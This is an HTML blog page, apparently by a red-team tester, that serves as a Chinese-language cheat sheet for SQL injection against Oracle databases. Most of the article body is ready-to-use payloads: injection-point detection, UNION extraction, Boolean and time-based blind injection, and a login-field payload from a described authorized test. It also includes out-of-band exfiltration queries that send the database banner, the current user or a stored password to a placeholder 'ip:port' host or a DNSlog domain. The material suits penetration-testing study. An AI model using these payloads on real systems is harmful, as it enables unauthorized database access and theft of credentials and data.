@@ -1,0 +1,502 @@
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<title>Oracle  注入 All in All - loecho</title>
+<link rel="shortcut icon" href="https://1oecho.github.io/favicon.ico">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.2.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.7.2/animate.min.css">
+<link rel="stylesheet" href="https://1oecho.github.io/media/css/tailwind.css">
+<link rel="stylesheet" href="https://1oecho.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="Oracle  注入 All in All - loecho - Atom Feed" href="https://1oecho.github.io/atom.xml">
+
+    
+
+  <meta name="description" content="Oracle 数据库常用于一些大型公司,因为他是收费的数据库,所以我也称他为有钱人的数据库,平时在测试中也经常遇到注入漏洞,所以就总结一下,注入过程,从注入判断到数据的获取,全过程记录,包含实际案例
+0x01 寻找并判断注入点
+数字型:
+数..." />
+  <meta property="og:title" content="Oracle  注入 All in All - loecho">
+  <meta property="og:description" content="Oracle 数据库常用于一些大型公司,因为他是收费的数据库,所以我也称他为有钱人的数据库,平时在测试中也经常遇到注入漏洞,所以就总结一下,注入过程,从注入判断到数据的获取,全过程记录,包含实际案例
+0x01 寻找并判断注入点
+数字型:
+数..." />
+  <meta property="og:type" content="articles">
+  <meta property="og:url" content="https://1oecho.github.io/oracle-sqli/" />
+  <meta property="og:image" content="https://1oecho.github.io/images/avatar.png">
+  <meta property="og:image:height" content="630">
+  <meta property="og:image:width" content="1200">
+  <meta name="twitter:title" content="Oracle  注入 All in All - loecho">
+  <meta name="twitter:description" content="Oracle 数据库常用于一些大型公司,因为他是收费的数据库,所以我也称他为有钱人的数据库,平时在测试中也经常遇到注入漏洞,所以就总结一下,注入过程,从注入判断到数据的获取,全过程记录,包含实际案例
+0x01 寻找并判断注入点
+数字型:
+数...">
+  <meta name="twitter:card" content="summary_large_image">
+  <link rel="canonical" href="https://1oecho.github.io/oracle-sqli/">
+
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css">
+ 
+  
+    <link rel="stylesheet" href="https://1oecho.github.io/media/css/prism-synthwave84.css">
+  
+
+  
+</head>
+
+<body>
+  <div class="antialiased flex flex-col min-h-screen" id="app">
+    <a href="https://1oecho.github.io" class="fixed top-0 left-0 mt-4 bg-black text-white dark:text-gray-700 dark:bg-yellow-50 dark:hover:bg-black dark:hover:text-white inline-flex p-2 pl-8 hover:text-gray-700 hover:bg-yellow-50 font-bold z-10 transition-fast animated fadeInLeft">
+      loecho
+    </a>
+    <div class="max-w-4xl w-full mx-auto">
+      <div class="shadow-box bg-white dark:bg-gray-600 rounded-lg pt-32 md:pt-64 px-4 md:px-8 pb-8 animated fadeIn mb-8">
+        <h1 class="text-5xl font-semibold leading-normal pb-8 mb-8 border-b-8 border-gray-700">
+          Oracle  注入 All in All
+        </h1>
+        
+        <div class="mb-8 flex flex-wrap">
+          <div class="text-gray-400 text-sm mr-4">2020-06-24 · 7 min read</div>
+          
+        </div>
+        <div class="markdown mb-8" v-pre>
+          <p><code>Oracle</code> 数据库常用于一些大型公司,因为他是收费的数据库,所以我也称他为有钱人的数据库,平时在测试中也经常遇到注入漏洞,所以就总结一下,注入过程,从注入判断到数据的获取,全过程记录,包含实际案例</p>
+<h2 id="0x01-寻找并判断注入点">0x01 寻找并判断注入点</h2>
+<h4 id="数字型">数字型:</h4>
+<p>数字型的注入,和其他类型数据库时都一样,自己构造<code>加减乘除</code>的条件来判断注入</p>
+<p>注意事项: <code>避免使用 and 1=1</code>大概率会被拦截的语句</p>
+<h3 id="payload">Payload:</h3>
+<pre><code class="language-sql">#通过 &lt;&gt; 来判断
+
+?id=1'+and+1&lt;&gt;1--+ #返回为真 页面正常
+?id=1'+and+1&lt;&gt;1--+ #返回为假 页面异常
+
+#通过 加减法来判断
+
+?id=1 #返回id,为1的内容
+?id=2-1  #返回为1的内容
+
+#通过数据库报错来判断
+
+?id=1 #返回为正常
+?id=1/0 #返回异常
+
+# 通过注释符来判断(多行注释:/**/,单行注释:--)
+
+?id=1 #返回为正常
+?id=1/*loecho*/ #也返回正常
+
+?id=1 #返回为正常
+?id=1--loecho #也返回正常
+</code></pre>
+<h4 id="字符型">字符型</h4>
+<p>字符型注入相对数字型来说,会存在闭合一些数据引用符号的问题,例如语句通过<code>'</code>闭合语句后,后续就要通过单行注释符来注释剩下的单引号,其他情况也是如此</p>
+<p>注意事项: <code>避免使用 and 1=1</code>大概率会被拦截的语句</p>
+<h4 id="payload-2">Payload:</h4>
+<pre><code class="language-sql">#通过&lt;&gt;来判断
+
+?name=loecho'+and+1&lt;&gt;6--+ #返回正常
+?name=loecho'+and+1&lt;&gt;1--+ #返回异常
+
+
+#使用字符串拼接符’||’，通过判断拼接符是否执行，从而判断是否存在注入
+
+?name=lo'||'echo #返回正常
+?name=lo'||'haha #返回异常
+</code></pre>
+<h2 id="0x02-利用并且查询数据">0x02 利用并且查询数据</h2>
+<h3 id="01-联合查询">01. 联合查询</h3>
+<ul>
+<li>
+<p><strong>即利用union select将想要查询的数据显示在页面上</strong>，所以只适用于没有屏蔽union和select关键字的情况，所需条件一般，利用难度一般。</p>
+</li>
+<li>
+<p>具体步骤如下:</p>
+</li>
+</ul>
+<pre><code class="language-sql"># 01.先判断列数,同Mysql一样
+
+?id=1'+order+by+4--+ #返回正常
+?id=1'+order+by+5--+ #提示报错
+
+得出结论数据为: 5 列
+
+# 02.然后对每一列的数据类型进行判断（可以使用null代替某些无法快速猜测出数据类型的位置），先默认每一列均为null，然后从第一列开始依次将null改为字符串，如果报错则说明该列是数字型，否则则是字符型。,同Mysql一样
+
+?id=1'+union+select+user+null+null+null+from+dual--+ #查询当前用户名
+以此类推
+
+# 03. 利用select table_name from user_tables where rownum=1获取表名（列名table数据同理）：
+
+select column_name from user_tab_columns where table_name='TB_USER' and rownum=1（获取列名）
+select USER_ID from TB_USER where USER_ID=1 and rownum=1（获取数据）
+</code></pre>
+<h3 id="02oob外带数据">02.OOB外带数据</h3>
+<p>通过HTTP请求,或者DNSlog,来构造语句,如果目标出网,并且对数据库函数没有进行限制,就会实现攻击</p>
+<ul>
+<li>HTTP 请求外带数据</li>
+</ul>
+<pre><code class="language-sql">and utl_http.request('http://ip:port/'||(select banner from sys.v_$version where rownum=1))=1--  查询指纹版
+ 
+and utl_http.request('http://ip:port/'%7C%7C(select SYS_CONTEXT ('USERENV', 'CURRENT_USER')from dual))=1 -- 查询环境
+
+
+and%20 utl_http.request('http://ip:port/'%7c%7c (select user from dual))=1-- 查询当前用户
+
+
+and%20%20utl_http.request(%27http://ip:port/%27%7c%7c(select%20instance_name%20from%20v$instance))=1--查询具体内容
+
+and utl_http.request('http://ip:port/'||(select TABLE_NAME from all_tables where rownum=1))=1-- 查询所有数据表名
+
+select name from v$database;
+
+select instance_name from v$instance;
+
+1.查询所有数据库
+
+由于Oralce没有库名,只有表空间,所以Oracle没有提供数据库名称查询支持，只提供了表空间名称查询。
+select * from v$tablespace;--查询表空间(需要一定权限)
+
+2.查询当前数据库中所有表名
+
+select * from user_tables;
+
+3.查询指定表中的所有字段名
+
+select column_name from user_tab_columns where table_name = 'table_name';
+
+
+4.查询指定表中的所有字段名和字段类型
+
+select column_name, data_type from user_tab_columns where table_name = 'table_name';
+
+</code></pre>
+<ul>
+<li>DSNlog请求外带数据</li>
+</ul>
+<pre><code class="language-sql">[UTL_HTTP.REQUEST]
+
+select name from test_user where id =1 union SELECT UTL_HTTP.REQUEST((select pass from test_user where id=1)||'.dnslog') FROM sys.DUAL;
+
+[DBMS_LDAP.INIT]
+
+select name from test_user where id =1 union SELECT DBMS_LDAP.INIT((select pass from test_user where id=1)||'.dnslog',80) FROM sys.DUAL;
+
+
+[HTTPURITYPE] 
+
+select name from test_user where id =1 union SELECT HTTPURITYPE((select pass from test_user where id=1)||'.dnslog').GETCLOB() FROM sys.DUAL;
+
+
+
+[UTL_INADDR.GET_HOST_ADDRESS] 
+
+select name from test_user where id =1 union SELECT UTL_INADDR.GET_HOST_ADDRESS((select pass from test_user where id=1)||'.dnslog') FROM sys.DUAL;
+</code></pre>
+<h3 id="03-基于布尔值的盲注">03. 基于布尔值的盲注</h3>
+<p>通过构造不同条件,返回返回页面的不同,就形成了Bool值的注入</p>
+<ul>
+<li>
+<p>通过 substr()  decode() 函数的盲注(常用)</p>
+<pre><code class="language-sql"># 按位截取数据,Bp俩个标记:第一个为截取位数,第二个为:所有字符:
+
+and+1=(select+decode(substr((select user from dual),§1§,1),'§S§',(1),0) from dual)--+ #查 user
+
+and+1=(select decode(substr((select banner from sys.v_$version wher rownum=1),1 ,1),'S',(1),0) from dual)--+ # 查version
+
+and+1=(select decode(substr((select table_name from user_tables where rownum=1),§1§,1),'§S§',(1),0) from dual)--+ # 查表名
+</code></pre>
+</li>
+<li>
+<p>通过 case、substr()、ascii() 函数的盲注</p>
+<pre><code class="language-sql"># 按位截取数据,Bp俩个标记:第一个为:截取位数 第二个为:所有可见字符的ASCII码(32~126):
+
+123=(case when ascii(substr(user,§0§,1))=§121§ then '123' else '456' end)--+
+</code></pre>
+</li>
+<li>
+<p>通过 case、instr()、chr() 函数的盲注</p>
+<pre><code class="language-sql"># 按位截取数据,Bp俩个标记:第一个为:所有可见字符的ASCII码(32~126): 第二个,第三个为:值相同为截取位数
+
+123=(case instr(user,chr(§*§),§*§,1) when §*§ then '123' else '456' end)--+
+
+</code></pre>
+</li>
+</ul>
+<p>还有其他方式来利用,配合函数,不同环境不同用法</p>
+<h3 id="03-基于时间的盲注">03 .基于时间的盲注</h3>
+<p>时间盲注，<strong>基于服务器返回所用的时间，判断函数是否执行，从而判断是否存在注入</strong></p>
+<ul>
+<li>
+<h3 id="decode-dbms_pipereceive_message-chr-substr利用">Decode()、DBMS_PIPE.receive_message()、chr()、substr()利用</h3>
+<pre><code class="language-sql"># 按位截取数据,Bp俩个标记:第一个为:截取位数 第二个为:所有可见字符的ASCII码(32~126):
+
+'||decode(substr(user,§*§,1),chr(§*§),DBMS_PIPE.receive_message('sen',1),2)||' #查user
+</code></pre>
+</li>
+</ul>
+<h2 id="0x03-实际案例分析">0x03 实际案例分析</h2>
+<p>某次授权测试,某小程序后端在检查登录时,存在Oracle注入漏洞,注入类型为基于布尔类型的注入</p>
+<h4 id="条件为真时">条件为真时:</h4>
+<figure data-type="image" tabindex="1"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog-Img/image-20200624150048076.png" alt="image-20200624150048076" loading="lazy"></figure>
+<h4 id="条件为假时">条件为假时:</h4>
+<figure data-type="image" tabindex="2"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog-Img/image-20200624150153336.png" alt="image-20200624150153336" loading="lazy"></figure>
+<ul>
+<li>由此构造条件来查询数据,当前数据库版本,结果如下</li>
+</ul>
+<h5 id="paylaod">Paylaod:</h5>
+<pre><code class="language-sql">{&quot;tel&quot;:&quot;18948888888/**/and/**/1=(select/**/decode(substr((select/**/banner/**/from/**/sys.v_$version/**/where/**/rownum=1),1 ,1),'S',(1),0)/**/from/**/dual)&quot;}
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog_Img/image-20200429202202524.png" alt="da" loading="lazy"></figure>
+<h2 id="0x04-somthing-bb">0x04 Somthing BB:</h2>
+<ol>
+<li>实际测试中,网站交互存在注入的概率不是很大,着重测试一些微应用的后端API,会有惊喜</li>
+<li>渗透测试的本质还是信息收集</li>
+<li>SQL注入真香…</li>
+</ol>
+
+        </div>
+        <!-- Share to Twitter, Weibo, Telegram -->
+        <div class="flex items-center">
+          <div class="mr-4 flex items-center">
+            <i class="ri-share-forward-line text-gray-500"></i>
+          </div>
+          <div class="px-4 cursor-pointer text-blue-500 hover:bg-blue-100 dark:hover:bg-gray-600 inline-flex" @click="shareToTwitter">
+            <i class="ri-twitter-line"></i>
+          </div>
+          <div class="px-4 cursor-pointer text-red-500 hover:bg-red-100 dark:hover:bg-gray-600 inline-flex" @click="shareToWeibo">
+            <i class="ri-weibo-line"></i>
+          </div>
+          <div class="px-4 cursor-pointer text-indigo-500 hover:bg-indigo-100 dark:hover:bg-gray-600 inline-flex" @click="shareToTelegram">
+            <i class="ri-telegram-line"></i>
+          </div>
+        </div>
+      </div>
+
+      
+
+      
+
+      <footer class="py-12 text-center px-4 md:px-0" v-pre>
+  Red Team@loecho /CTFer@Web /SRC
+</footer>
+    </div>
+
+    <!-- TOC Container -->
+    <div class="fixed right-0 bottom-0 mb-16 mr-4 shadow w-8 h-8 rounded-full flex justify-center items-center z-10 cursor-pointer bg-white dark:bg-gray-500 dark:text-gray-200 hover:shadow-lg transition-all animated fadeInRight" @click="showToc = true">
+      <i class="ri-file-list-line"></i>
+    </div>
+
+    <div class="fixed right-0 top-0 bottom-0 overflow-y-auto w-64 bg-white dark:bg-gray-800 p-4 border-l border-gray-100 dark:border-gray-600 z-10 transition-fast" :class="{ '-mr-64': !showToc }">
+      <div class="flex mb-4 justify-end">
+        <div class="w-8 h-8 inline-flex justify-center items-center rounded-full cursor-pointer hover:bg-gray-200 dark:hover:bg-gray-600 transition-fast" @click="showToc = false">
+          <i class="ri-close-line text-lg"></i>
+        </div>
+      </div>
+      <div class="post-toc-container">
+        <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#0x01-%E5%AF%BB%E6%89%BE%E5%B9%B6%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%82%B9">0x01 寻找并判断注入点</a><br>
+*
+<ul>
+<li><a href="#%E6%95%B0%E5%AD%97%E5%9E%8B">数字型:</a></li>
+<li><a href="#payload">Payload:</a>
+<ul>
+<li><a href="#%E5%AD%97%E7%AC%A6%E5%9E%8B">字符型</a></li>
+<li><a href="#payload-2">Payload:</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#0x02-%E5%88%A9%E7%94%A8%E5%B9%B6%E4%B8%94%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE">0x02 利用并且查询数据</a>
+<ul>
+<li><a href="#01-%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2">01. 联合查询</a></li>
+<li><a href="#02oob%E5%A4%96%E5%B8%A6%E6%95%B0%E6%8D%AE">02.OOB外带数据</a></li>
+<li><a href="#03-%E5%9F%BA%E4%BA%8E%E5%B8%83%E5%B0%94%E5%80%BC%E7%9A%84%E7%9B%B2%E6%B3%A8">03. 基于布尔值的盲注</a></li>
+<li><a href="#03-%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4%E7%9A%84%E7%9B%B2%E6%B3%A8">03 .基于时间的盲注</a></li>
+<li><a href="#decode-dbms_pipereceive_message-chr-substr%E5%88%A9%E7%94%A8">Decode()、DBMS_PIPE.receive_message()、chr()、substr()利用</a></li>
+</ul>
+</li>
+<li><a href="#0x03-%E5%AE%9E%E9%99%85%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90">0x03 实际案例分析</a><br>
+*
+<ul>
+<li><a href="#%E6%9D%A1%E4%BB%B6%E4%B8%BA%E7%9C%9F%E6%97%B6">条件为真时:</a></li>
+<li><a href="#%E6%9D%A1%E4%BB%B6%E4%B8%BA%E5%81%87%E6%97%B6">条件为假时:</a>
+<ul>
+<li><a href="#paylaod">Paylaod:</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#0x04-somthing-bb">0x04 Somthing BB:</a></li>
+</ul>
+</li>
+</ul>
+
+      </div>
+    </div>
+
+    <!-- Back to top -->
+    <div class="fixed right-0 bottom-0 mb-4 mr-4 shadow w-8 h-8 rounded-full flex justify-center items-center z-10 cursor-pointer bg-white hover:shadow-lg transition-all dark:bg-gray-500 dark:text-gray-200" @click="backToUp" v-show="scrolled">
+      <i class="ri-arrow-up-line"></i>
+    </div>
+  </div>
+
+  <!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+  <!-- Background of PhotoSwipe. 
+        It's a separate element as animating opacity is faster than rgba(). -->
+  <div class="pswp__bg">
+  </div>
+  <!-- Slides wrapper with overflow:hidden. -->
+  <div class="pswp__scroll-wrap">
+    <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+    <div class="pswp__container">
+      <div class="pswp__item">
+      </div>
+      <div class="pswp__item">
+      </div>
+      <div class="pswp__item">
+      </div>
+    </div>
+    <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+    <div class="pswp__ui pswp__ui--hidden">
+      <div class="pswp__top-bar">
+        <!--  Controls are self-explanatory. Order can be changed. -->
+        <div class="pswp__counter">
+        </div>
+        <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+        <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+        <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+        <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+        <!-- element will get class pswp__preloader--active when preloader is running -->
+        <div class="pswp__preloader">
+          <div class="pswp__preloader__icn">
+            <div class="pswp__preloader__cut">
+              <div class="pswp__preloader__donut">
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+        <div class="pswp__share-tooltip">
+        </div>
+      </div>
+      <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+      </button>
+      <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+      </button>
+      <div class="pswp__caption">
+        <div class="pswp__caption__center">
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+  <script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+  <script src="https://1oecho.github.io/media/scripts/main.js"></script>
+  
+  <!-- Code Highlight -->
+  
+    <script src="https://1oecho.github.io/media/prism.js"></script>
+    <script>
+      Prism.highlightAll()
+    </script>
+  
+
+  <script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>
+  <script>
+    //拿到预览框架，也就是上面的html代码
+    var pswpElement = document.querySelectorAll('.pswp')[0];
+    //定义图片数组变量
+    var imgitems;
+    /**
+    * 用于显示预览界面
+    * @param index 图片数组下标
+    */
+    function viewImg(index) {
+      //其它选项这里不做过多阐述，详情见官网
+      var pswpoptions = {
+        index: parseInt(index, 10), // 开始幻灯片索引。0是第一张幻灯片。必须是整数，而不是字符串。
+        bgOpacity: 0.7, // 背景透明度，0-1
+        maxSpreadZoom: 3, // 缩放级别，不要太大
+      };
+      //初始化并打开PhotoSwipe，pswpElement对应上面预览框架，PhotoSwipeUI_Default为皮肤，imgitems为图片数组，pswpoptions为选项
+      var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, imgitems, pswpoptions);
+      gallery.init()
+    }
+    /**
+    * 用于添加图片点击事件
+    * @param img 图片元素
+    * @param index 所属下标（在imgitems中的位置）
+    */
+    function addImgClick(img, index) {
+      img.onclick = function() {
+        viewImg(index)
+      }
+    }
+    /**
+    * 轮询所有图片，获取src、width、height等数据，加入imgitems，并给图片元素添加事件
+    * 最好在onload中执行该方法，本站因放在最底部，所以直接初始化
+    * 异步加载图片可在图片元素创建完成后调用此方法
+    */
+    function initImg() {
+      //重置图片数组
+      imgitems = [];
+      //查找class:markdown 下的所有img元素并遍历
+      var imgs = document.querySelectorAll('.markdown img');
+      for (var i = 0; i < imgs.length; i++) {
+        var img = imgs[i];
+        //本站相册初始为loading图片，真实图片放在data-src
+        var ds = img.getAttribute("data-src");
+        //创建image对象，用于获取图片宽高
+        var imgtemp = new Image();
+        //判断是否存在data-src
+        if (ds != null && ds.length > 0) {
+          imgtemp.src = ds
+        } else {
+          imgtemp.src = img.src
+        }
+        //判断是否存在缓存
+        if (imgtemp.complete) {
+          var imgobj = {
+            "src": imgtemp.src,
+            "w": imgtemp.width,
+            "h": imgtemp.height,
+          };
+          imgitems[i] = imgobj;
+          addImgClick(img, i);
+        } else {
+          console.log('进来了2')
+          imgtemp.index = i;
+          imgtemp.img = img;
+          imgtemp.onload = function() {
+            var imgobj = {
+              "src": this.src,
+              "w": this.width,
+              "h": this.height,
+            };
+            //不要使用push，因为onload前后顺序会不同
+            imgitems[this.index] = imgobj
+            //添加点击事件
+            addImgClick(this.img, this.index);
+          }
+        }
+      }
+    }
+    //初始化
+    initImg();
+  </script>
+  
+  
+</body>
+
+</html>
